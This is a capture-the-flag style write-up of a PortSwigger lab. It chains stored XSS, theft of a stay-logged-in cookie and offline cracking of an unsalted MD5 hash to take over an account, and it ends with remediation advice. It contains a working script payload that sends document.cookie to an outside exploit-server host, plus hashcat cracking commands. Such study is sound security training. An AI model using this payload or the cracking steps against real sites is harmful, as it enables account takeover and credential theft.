# PortSwigger Lab: Offline Password Cracking

**Author:** Neelesh Pandey  
**Platform:** PortSwigger Web Security Academy  
**Difficulty:** Practitioner  
**Category:** Authentication / XSS + Cookie Theft + Hash Cracking  
**Lab:** Offline password cracking  

---

## Overview

This lab chains two vulnerabilities together to compromise a user account — a **stored XSS** in the comment functionality combined with a **predictable stay-logged-in cookie** containing an unsalted MD5 password hash. By stealing Carlos's cookie via XSS and cracking the MD5 hash offline, full account access is achieved without ever knowing or brute-forcing the password directly.

This is a realistic attack chain that mirrors real-world credential theft scenarios.

---

## Attack Chain Overview

```
Stored XSS in comments
        ↓
Victim visits page → cookie stolen to exploit server
        ↓
Base64 decode cookie → extract MD5 hash
        ↓
Crack MD5 hash offline (search engine / hashcat)
        ↓
Login as carlos → delete account
```

---

## 1. Reconnaissance

### Cookie Analysis

Logged in as `wiener:peter` with Stay logged in selected. Inspected the `stay-logged-in` cookie:

```
Base64 decode → wiener:51dc30ddc473d43a6011e9ebba6ca770
```

**Formula confirmed** (from previous lab):
```
stay-logged-in = base64( username + ":" + md5(password) )
```

If Carlos's cookie can be obtained, the MD5 hash can be extracted and cracked offline.

### XSS Discovery

Tested the comment functionality on a blog post. The comment content is rendered unsanitised in the page — **stored XSS confirmed**.

---

## 2. Stealing Carlos's Cookie via XSS

### Step 1 — Note Exploit Server URL

Opened the provided exploit server and noted the URL:
```
https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net
```

### Step 2 — Post Malicious Comment

Posted the following payload as a blog comment:

```javascript
<script>document.location='//YOUR-EXPLOIT-SERVER-ID.exploit-server.net/'+document.cookie</script>
```

**How this works:**
- `document.location` redirects the victim's browser
- `document.cookie` appends all cookies as part of the URL path
- When Carlos visits the page, his browser executes the script
- His cookies — including `stay-logged-in` — are sent to the exploit server as a GET request

### Step 3 — Capture Cookie from Exploit Server Logs

Opened exploit server → Access log. Found a GET request from Carlos:

```
GET /stay-logged-in=Y2FybG9zOjI2MzIzYzE2ZDVmNGRhYmZmM2JiMTM2ZjI0NjBhOTQz HTTP/1.1
```

**Carlos's stay-logged-in cookie captured.**

---

## 3. Decoding the Cookie

Decoded the captured cookie in Burp Decoder:

```
Y2FybG9zOjI2MzIzYzE2ZDVmNGRhYmZmM2JiMTM2ZjI0NjBhOTQz
→ carlos:26323c16d5f4dabff3bb136f2460a943
```

| Component | Value |
|-----------|-------|
| Username | carlos |
| MD5 Hash | 26323c16d5f4dabff3bb136f2460a943 |

---

## 4. Cracking the Hash Offline

### Method 1 — Search Engine (Lab Approach)

Pasted `26323c16d5f4dabff3bb136f2460a943` into a search engine.

**Result:** Password = `onceuponatime`

This works because unsalted MD5 hashes of common passwords are indexed in online databases and rainbow tables. The same hash always produces the same output — `md5("onceuponatime")` is a known value.

### Method 2 — hashcat (Real-World Approach)

In a real engagement, a tool like hashcat would be used:

```bash
# Save hash to file
echo "26323c16d5f4dabff3bb136f2460a943" > hash.txt

# Crack with rockyou wordlist
hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt

# -m 0 = MD5 mode
# Result: 26323c16d5f4dabff3bb136f2460a943:onceuponatime
```

**Note:** Never submit client password hashes to online search engines during real engagements — use hashcat locally.

---

## 5. Account Takeover

Logged in as `carlos:onceuponatime` → navigated to My account → deleted the account → lab solved.

---

## 6. Why This Attack Chain Works

| Step | Vulnerability | Impact |
|------|--------------|--------|
| XSS in comments | Stored XSS — no output encoding | Arbitrary JavaScript executed in victim's browser |
| Cookie accessible via JS | No HttpOnly flag on stay-logged-in | `document.cookie` returns the sensitive cookie |
| Predictable cookie | MD5(password) without salt | Hash crackable offline via wordlist or rainbow table |
| No CSP | Content Security Policy absent | External redirects via `document.location` not blocked |

Each vulnerability alone has limited impact — chained together they result in complete account takeover.

---

## 7. Attack Flow Summary

```
Login as wiener → confirm cookie = base64(username:md5(password))
        ↓
Comment functionality tested → stored XSS confirmed
        ↓
Payload posted: <script>document.location='//exploit-server/'+document.cookie</script>
        ↓
Carlos visits blog → script executes → cookies sent to exploit server
        ↓
Exploit server log: GET /stay-logged-in=Y2FybG9z...
        ↓
Base64 decode → carlos:26323c16d5f4dabff3bb136f2460a943
        ↓
MD5 hash cracked → onceuponatime
        ↓
Login: carlos:onceuponatime → delete account → solved
```

---

## 8. Key Takeaways

- **Vulnerability chaining multiplies impact** — XSS alone is limited if cookies are HttpOnly; predictable cookies alone require brute-force; combined they result in instant account takeover
- **HttpOnly flag prevents `document.cookie` access** — if the stay-logged-in cookie had HttpOnly set, the XSS payload could not read it; this single flag would have broken the entire attack chain
- **Unsalted MD5 is instantly crackable** — common password hashes are indexed publicly; a search engine effectively acts as a precomputed rainbow table
- **Never submit client hashes to online services** — in real engagements, use hashcat locally to avoid leaking sensitive data
- **Stored XSS is more dangerous than reflected** — stored payloads execute automatically for every user who visits the page, not just those who click a crafted link
- **Cookie theft via XSS is a classic attack** — `document.location` + `document.cookie` is one of the most fundamental XSS exploitation techniques

---

## 9. Real-World Relevance

This exact attack chain (XSS → cookie theft → hash cracking) appears in real bug bounty reports. Key conditions:

- Stored XSS in user-generated content (comments, profiles, messages)
- Authentication cookies without HttpOnly flag
- Weak cookie construction (predictable formula, weak hash)

In real bug bounty: find XSS → check if `document.cookie` returns authentication tokens → if tokens contain crackable hashes, the impact escalates from XSS to full account takeover.

---

## 10. Remediation

| Finding | Risk | Fix |
|---------|------|-----|
| Stored XSS in comments | Critical | Encode all user-generated output — use HTML entity encoding before rendering |
| stay-logged-in without HttpOnly | Critical | Set HttpOnly flag — prevents JavaScript from accessing the cookie |
| MD5 password hash in cookie | Critical | Use cryptographically random token — never store password derivatives in cookies |
| No Content Security Policy | High | Implement CSP to block unauthorized external redirects and script execution |
| Unsalted MD5 | Critical | Use bcrypt/Argon2 with per-user salt for all password storage |

**Secure cookie setup:**
```http
Set-Cookie: stay-logged-in=<random-token>; HttpOnly; Secure; SameSite=Strict
```

**HttpOnly** — JavaScript cannot read this cookie  
**Secure** — only sent over HTTPS  
**SameSite=Strict** — not sent on cross-site requests (CSRF protection)

---

## Tools Used

| Tool | Purpose |
|------|---------|
| Burp Suite Professional | Proxy, cookie inspection, Decoder |
| Exploit server | Receiving stolen cookies via XSS redirect |
| Search engine / hashcat | Offline MD5 hash cracking |
| Burp Decoder | Base64 decoding of captured cookie |

---

## References

- [PortSwigger — Offline Password Cracking](https://portswigger.net/web-security/authentication/other-mechanisms/lab-offline-password-cracking)
- [PortSwigger — Cross-Site Scripting](https://portswigger.net/web-security/cross-site-scripting)
- [hashcat — Hash Cracking Tool](https://hashcat.net/hashcat/)
- [OWASP — Testing for Cookies Attributes](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/06-Session_Management_Testing/02-Testing_for_Cookies_Attributes)

---

*Write-up by Neelesh Pandey — [GitHub](https://github.com/Neelesh707) | [LinkedIn](https://www.linkedin.com/in/neelesh-pandey021/)*
